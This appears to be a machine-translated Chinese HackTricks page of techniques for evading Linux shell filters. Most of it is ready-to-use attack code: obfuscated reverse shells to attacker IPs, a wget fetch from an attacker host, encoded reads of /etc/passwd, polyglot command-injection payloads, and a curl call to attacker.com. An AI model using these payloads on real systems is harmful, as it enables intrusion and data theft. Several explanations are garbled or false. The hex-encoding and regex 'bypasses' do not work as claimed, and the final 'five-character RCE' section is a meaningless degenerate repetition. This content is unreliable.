# 绕过Linux限制

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 常见限制绕过

### 反向Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### 简短的反向Shell

A reverse shell is a technique used in hacking to establish a connection between the attacker's machine and the compromised system. It allows the attacker to gain remote access and control over the compromised system.

To create a short reverse shell, you can use the following command:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

Replace `ATTACKER_IP` with the IP address of your machine and `ATTACKER_PORT` with the port number you want to use for the connection.

This command redirects the input and output of the bash shell to a TCP connection established with the attacker's machine. It enables the attacker to execute commands on the compromised system and receive the output on their machine.

Keep in mind that using reverse shells for unauthorized access to systems is illegal and unethical. This information is provided for educational purposes only.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### 绕过路径和禁用词

When conducting a penetration test or trying to gain unauthorized access to a system, it is common to encounter restrictions on certain paths and forbidden words. These restrictions are put in place to prevent unauthorized access and protect the system from potential vulnerabilities.

However, as a hacker, it is important to know how to bypass these restrictions and find alternative paths to achieve your goals. Here are some useful Linux commands that can help you bypass paths and forbidden words:

1. **mv** command: The `mv` command can be used to rename files and directories. By renaming a restricted file or directory to a non-restricted name, you can bypass the restriction and gain access.

2. **ln** command: The `ln` command can be used to create symbolic links. By creating a symbolic link to a restricted file or directory with a non-restricted name, you can bypass the restriction and gain access.

3. **find** command: The `find` command can be used to search for files and directories. By using the `-iname` option, you can search for files and directories regardless of case sensitivity. This can help you bypass restrictions on forbidden words.

4. **grep** command: The `grep` command can be used to search for specific patterns in files. By using the `-i` option, you can perform a case-insensitive search, allowing you to bypass restrictions on forbidden words.

5. **sed** command: The `sed` command can be used to perform text transformations. By using the `s/old/new/gi` syntax, you can replace forbidden words with non-restricted words, bypassing the restrictions.

Remember, bypassing restrictions and gaining unauthorized access to a system is illegal and unethical. These commands should only be used for educational purposes or with proper authorization. Always ensure you have the necessary permissions before attempting any actions on a system.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 绕过禁止空格

In some cases, when trying to execute commands that contain spaces, you may encounter restrictions that prevent the execution. However, there are several techniques you can use to bypass these restrictions and successfully execute the desired commands.

在某些情况下，当尝试执行包含空格的命令时，可能会遇到阻止执行的限制。然而，有几种技术可以绕过这些限制并成功执行所需的命令。

#### Technique 1: Enclosing the command in quotes

One way to bypass the restriction is to enclose the entire command in quotes. This tells the shell to treat the entire command as a single argument, effectively bypassing any restrictions on spaces.

#### 技术1：在引号中包含命令

绕过限制的一种方法是将整个命令包含在引号中。这告诉shell将整个命令视为单个参数，有效地绕过任何对空格的限制。

```bash
$ echo "command with spaces"
```

#### Technique 2: Using escape characters

Another technique is to use escape characters, such as backslashes, to escape the spaces in the command. This tells the shell to treat the spaces as literal characters and not as argument separators.

#### 技术2：使用转义字符

另一种技术是使用转义字符，例如反斜杠，来转义命令中的空格。这告诉shell将空格视为字面字符，而不是参数分隔符。

```bash
$ echo command\ with\ spaces
```

#### Technique 3: Using alternative whitespace characters

Some shells allow the use of alternative whitespace characters, such as tabs or newlines, instead of spaces. By using these alternative characters, you can bypass the restrictions on spaces.

#### 技术3：使用替代的空白字符

一些shell允许使用替代的空白字符，例如制表符或换行符，而不是空格。通过使用这些替代字符，您可以绕过对空格的限制。

```bash
$ echo command$'\t'with$'\t'spaces
```

By employing these techniques, you can bypass restrictions on spaces and successfully execute commands that contain spaces. However, it is important to note that these techniques may not work in all scenarios, as they depend on the specific configuration and restrictions in place.

通过使用这些技术，您可以绕过对空格的限制并成功执行包含空格的命令。然而，需要注意的是，这些技术可能在所有情况下都不起作用，因为它们取决于特定的配置和限制。
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### 绕过反斜杠和斜杠限制

在某些情况下，系统管理员可能会限制用户在命令行中使用反斜杠（\）和斜杠（/）字符。这些限制可能会妨碍我们执行某些操作，但我们可以使用一些技巧来绕过这些限制。

#### 使用ASCII码

我们可以使用ASCII码来绕过反斜杠和斜杠的限制。每个字符都有一个对应的ASCII码值，我们可以使用这些值来代替字符。

例如，要输入反斜杠字符（\），我们可以使用ASCII码值`\`（92）来代替。同样地，要输入斜杠字符（/），我们可以使用ASCII码值`/`（47）来代替。

以下是使用ASCII码绕过反斜杠和斜杠限制的示例：

```bash
$ echo -e "\x5c"  # 使用ASCII码值92代替反斜杠
\
$ echo -e "\x2f"  # 使用ASCII码值47代替斜杠
/
```

#### 使用Unicode编码

除了ASCII码，我们还可以使用Unicode编码来绕过反斜杠和斜杠的限制。Unicode编码是一种用于表示字符的标准编码系统。

要输入反斜杠字符（\），我们可以使用Unicode编码`\u005c`来代替。同样地，要输入斜杠字符（/），我们可以使用Unicode编码`\u002f`来代替。

以下是使用Unicode编码绕过反斜杠和斜杠限制的示例：

```bash
$ echo -e "\u005c"  # 使用Unicode编码\u005c代替反斜杠
\
$ echo -e "\u002f"  # 使用Unicode编码\u002f代替斜杠
/
```

通过使用ASCII码或Unicode编码，我们可以绕过反斜杠和斜杠的限制，以执行我们需要的操作。
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### 绕过管道限制

在某些情况下，您可能会遇到受限制的Bash环境，其中禁用了某些命令或功能。然而，您可以使用管道操作符（`|`）来绕过这些限制，并执行被禁用的命令。

以下是一些绕过管道限制的方法：

1. 使用`less`命令：如果`more`命令被禁用，您可以使用`less`命令来查看文件内容。例如，`cat file.txt | less`。

2. 使用`grep`命令：如果`sed`或`awk`命令被禁用，您可以使用`grep`命令来进行文本处理。例如，`cat file.txt | grep "pattern"`。

3. 使用`tee`命令：如果您需要将输出重定向到文件，但`>`或`>>`被禁用，您可以使用`tee`命令来实现。例如，`command | tee file.txt`。

请注意，这些方法只是绕过管道限制的一种方式，并不适用于所有情况。在进行任何绕过操作之前，请确保您了解并遵守适用法律和规定，并获得适当的授权。
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### 通过十六进制编码绕过限制

Sometimes, when trying to execute certain commands or access restricted files, you may encounter restrictions imposed by the system. One way to bypass these restrictions is by using hex encoding.

有时候，在尝试执行特定命令或访问受限文件时，你可能会遇到系统强加的限制。绕过这些限制的一种方法是使用十六进制编码。

Hex encoding involves converting the characters of a command or file path into their hexadecimal representation. This can be done using the `xxd` command in Linux.

十六进制编码涉及将命令或文件路径的字符转换为十六进制表示。在Linux中，可以使用`xxd`命令来完成这个过程。

To bypass restrictions using hex encoding, follow these steps:

要通过十六进制编码绕过限制，请按照以下步骤进行操作：

1. Identify the command or file path that is restricted.

   确定受限制的命令或文件路径。

2. Convert the characters of the command or file path into their hexadecimal representation using the `xxd` command. For example, to convert the command `ls` into hexadecimal, you would run:

   使用`xxd`命令将命令或文件路径的字符转换为十六进制表示。例如，要将命令`ls`转换为十六进制，可以运行以下命令：

   ```bash
   echo -n "ls" | xxd -p
   ```

   This will output the hexadecimal representation of the command, which in this case would be `6c73`.

   这将输出命令的十六进制表示，对于这个例子来说，输出结果是`6c73`。

3. Use the hexadecimal representation of the command or file path to bypass the restrictions. For example, instead of running `ls`, you would run:

   使用命令或文件路径的十六进制表示来绕过限制。例如，不要运行`ls`，而是运行以下命令：

   ```bash
   echo -e "\x6c\x73"
   ```

   This will execute the command `ls` by using its hexadecimal representation.

   这将通过使用命令的十六进制表示来执行`ls`命令。

By using hex encoding, you can bypass certain restrictions imposed by the system and execute commands or access files that would otherwise be restricted.

通过使用十六进制编码，你可以绕过系统强加的某些限制，执行命令或访问本来受限的文件。
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### 绕过IP限制

Sometimes, during a penetration test, you may encounter situations where certain IP addresses are restricted or blocked. In such cases, you can use various techniques to bypass these IP restrictions and gain access to the target system. Here are some useful Linux commands that can help you achieve this:

#### 1. IP Spoofing

IP spoofing involves modifying the source IP address of network packets to make it appear as if they are coming from a different IP address. This can be done using the `hping3` command. Here's an example:

```bash
hping3 -a <spoofed_ip> -c 1 <target_ip>
```

Replace `<spoofed_ip>` with the IP address you want to spoof and `<target_ip>` with the IP address of the target system.

#### 2. Proxychains

Proxychains is a tool that allows you to run any program through a proxy server. This can help you bypass IP restrictions by routing your traffic through a different IP address. Here's how you can use it:

```bash
proxychains <command>
```

Replace `<command>` with the command you want to run through the proxy.

#### 3. VPN

Using a Virtual Private Network (VPN) can also help you bypass IP restrictions. A VPN creates a secure connection between your device and a remote server, allowing you to browse the internet using the server's IP address. There are various VPN clients available for Linux, such as OpenVPN and WireGuard.

#### 4. Tor

Tor is a network of volunteer-operated servers that allows you to browse the internet anonymously. By routing your traffic through multiple Tor nodes, you can bypass IP restrictions and access blocked websites. To use Tor, you can install the Tor Browser or configure your system to use the Tor network.

These are just a few techniques that can be used to bypass IP restrictions during a penetration test. It's important to note that unauthorized access to systems or networks is illegal and should only be done with proper authorization and for legitimate purposes.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 基于时间的数据泄露

Time based data exfiltration is a technique used by hackers to extract sensitive information from a target system by utilizing timing delays. This technique is particularly useful when traditional methods of data exfiltration, such as network connections, are restricted or monitored.

基于时间的数据泄露是黑客利用时间延迟从目标系统中提取敏感信息的一种技术。当传统的数据泄露方法，如网络连接，受到限制或监控时，这种技术尤其有用。

The concept behind time based data exfiltration is to encode the sensitive information into a format that can be transmitted through timing delays. This can be achieved by manipulating the timing of certain operations or by introducing deliberate delays in the execution of commands.

基于时间的数据泄露的概念是将敏感信息编码成可以通过时间延迟传输的格式。可以通过操作的时间安排或者在命令执行中引入故意的延迟来实现这一点。

For example, a hacker may use the `ping` command to send ICMP echo requests to a remote server. By manipulating the payload of the ICMP packets, the hacker can encode sensitive information into the timing delays between the requests and responses. The remote server can then decode the information by analyzing the timing patterns of the ICMP packets.

例如，黑客可以使用`ping`命令向远程服务器发送ICMP回显请求。通过操纵ICMP数据包的有效载荷，黑客可以将敏感信息编码到请求和响应之间的时间延迟中。远程服务器可以通过分析ICMP数据包的时间模式来解码信息。

Time based data exfiltration can be a stealthy technique as it does not rely on traditional network connections that may be monitored or blocked. However, it can also be slower and more prone to errors compared to other methods of data exfiltration.

基于时间的数据泄露可以是一种隐蔽的技术，因为它不依赖于可能被监控或阻止的传统网络连接。然而，与其他数据泄露方法相比，它可能更慢且更容易出错。

To defend against time based data exfiltration, it is important to implement proper security measures such as network monitoring, intrusion detection systems, and regular security audits. Additionally, restricting access to sensitive information and implementing strong access controls can help mitigate the risk of data exfiltration.

为了防止基于时间的数据泄露，重要的是要实施适当的安全措施，如网络监控、入侵检测系统和定期安全审计。此外，限制对敏感信息的访问并实施强大的访问控制可以帮助减轻数据泄露的风险。
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 从环境变量中获取字符

In some cases, you may encounter restrictions that prevent you from executing certain commands or accessing certain files. However, you may still be able to bypass these restrictions by leveraging the environment variables available to you.

在某些情况下，您可能会遇到阻止您执行某些命令或访问某些文件的限制。然而，您仍然可以通过利用可用的环境变量来绕过这些限制。

One useful technique is to use the `echo` command along with environment variables to extract characters. By setting an environment variable to a specific character and then echoing its value, you can retrieve that character.

一个有用的技巧是使用`echo`命令和环境变量来提取字符。通过将环境变量设置为特定字符，然后回显其值，您可以检索该字符。

Here's an example of how you can use this technique:

以下是您可以使用此技巧的示例：

```bash
$ export CHAR='a'
$ echo $CHAR
a
```

In this example, we set the `CHAR` environment variable to the character 'a' and then echo its value. The output will be the character 'a'.

在这个例子中，我们将`CHAR`环境变量设置为字符'a'，然后回显其值。输出将是字符'a'。

You can use this technique to extract multiple characters by setting different environment variables to different characters and echoing their values one by one.

您可以使用此技巧通过将不同的环境变量设置为不同的字符并逐个回显它们的值来提取多个字符。

```bash
$ export CHAR1='a'
$ export CHAR2='b'
$ echo $CHAR1$CHAR2
ab
```

In this example, we set `CHAR1` to 'a' and `CHAR2` to 'b'. By echoing the values of `CHAR1` and `CHAR2` together, we can retrieve the characters 'a' and 'b' as the output.

在这个例子中，我们将`CHAR1`设置为'a'，`CHAR2`设置为'b'。通过一起回显`CHAR1`和`CHAR2`的值，我们可以将字符'a'和'b'作为输出检索出来。

By combining this technique with other methods, you can bypass restrictions and perform actions that would otherwise be blocked.

通过将此技巧与其他方法结合使用，您可以绕过限制并执行否则将被阻止的操作。
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS数据泄露

你可以使用**burpcollab**或[**pingb**](http://pingb.in)等工具。

### 内置命令

如果你无法执行外部函数，只能访问**有限的内置命令来获取RCE**，那么有一些巧妙的技巧可以帮助你。通常你**无法使用所有的**内置命令，所以你应该**了解所有的选择**来尝试绕过限制。灵感来自[**devploit**](https://twitter.com/devploit)。\
首先，检查所有的[**shell内置命令**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**。**然后，这里有一些建议：
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### 多语言命令注入

Polyglot command injection (多语言命令注入) 是一种利用不同语言解释器的漏洞来执行恶意命令的技术。这种攻击方法可以绕过基于特定语言的命令过滤和限制，从而使攻击者能够在目标系统上执行任意命令。

在多语言命令注入攻击中，攻击者利用目标系统上安装的多个解释器（如Bash、Python、Perl等）之间的差异来构造恶意命令。通过使用特定的语法和技巧，攻击者可以在不同的解释器中执行相同的命令，从而绕过特定解释器的限制。

为了成功执行多语言命令注入攻击，攻击者需要了解目标系统上安装的不同解释器的语法和特性。他们还需要找到可以在多个解释器中执行的命令，以便在攻击过程中选择合适的解释器。

为了防止多语言命令注入攻击，建议采取以下措施：

- 定期更新和维护系统上安装的解释器，以确保已修复已知的漏洞。
- 限制解释器的访问权限，仅允许授权用户执行命令。
- 验证和过滤用户输入，以防止恶意命令注入。
- 使用安全编码实践，如避免使用用户输入直接构造命令。

通过采取这些措施，可以减少多语言命令注入攻击的风险，并提高系统的安全性。
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 绕过潜在的正则表达式限制

在进行渗透测试时，有时会遇到正则表达式的限制，这可能会阻碍我们的进一步操作。然而，我们可以使用一些技巧来绕过这些限制。

#### 1. 使用字符类

正则表达式中的字符类可以帮助我们绕过某些限制。例如，如果我们想匹配一个数字，但是正则表达式限制了我们只能使用字母，我们可以使用字符类来绕过这个限制。例如，`[0-9]`可以匹配任何数字。

#### 2. 使用转义字符

转义字符可以帮助我们绕过正则表达式的限制。例如，如果正则表达式限制了我们不能使用特殊字符，我们可以使用转义字符`\`来转义这些字符。例如，`\.`可以匹配一个点。

#### 3. 使用反向引用

反向引用可以帮助我们绕过正则表达式的限制。如果正则表达式限制了我们不能使用某些特定的字符串，但是我们可以使用其他字符串，我们可以使用反向引用来引用这些字符串。例如，如果正则表达式限制了我们不能使用`abc`，但是我们可以使用`def`，我们可以使用反向引用`\1`来引用`def`。

#### 4. 使用非贪婪匹配

非贪婪匹配可以帮助我们绕过正则表达式的限制。正则表达式通常是贪婪匹配，即尽可能多地匹配字符。但是，如果我们想要匹配尽可能少的字符，我们可以使用非贪婪匹配。例如，`.*?`可以匹配尽可能少的任意字符。

#### 5. 使用零宽断言

零宽断言可以帮助我们绕过正则表达式的限制。零宽断言是一种特殊的正则表达式语法，用于在匹配字符串时指定一些条件。例如，如果正则表达式限制了我们只能匹配一个特定的字符串，我们可以使用零宽断言来指定其他条件。例如，`(?=.*[A-Z])`可以匹配包含至少一个大写字母的字符串。

通过使用这些技巧，我们可以绕过正则表达式的限制，从而更好地进行渗透测试。
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator是一个工具，用于绕过Bash脚本中的限制。它可以对Bash脚本进行混淆，使其难以理解和分析。Bashfuscator通过使用各种技术，如变量替换、函数重命名和代码重排，来改变脚本的结构和逻辑。这使得脚本的分析和检测变得更加困难，从而增加了攻击者成功执行恶意操作的难度。

使用Bashfuscator时，可以通过以下命令来混淆Bash脚本：

```bash
bashfuscator -i input_script.sh -o output_script.sh
```

其中，`input_script.sh`是要混淆的Bash脚本的输入文件，`output_script.sh`是混淆后的脚本的输出文件。

Bashfuscator还提供了其他选项，如`-v`用于显示详细的输出信息，`-r`用于启用随机化技术，以增加混淆的效果。

请注意，Bashfuscator仅用于教育和研究目的，使用它进行非法活动是违法的。
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 五个字符实现远程命令执行（RCE）

在某些情况下，我们可能会遇到受限制的环境，其中我们无法使用常规的命令执行技术。然而，我们仍然可以利用一些特殊的字符来绕过这些限制，并实现远程命令执行（RCE）。

以下是一个使用仅限于五个字符的技巧，用于在受限制的环境中实现RCE：

```bash
${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS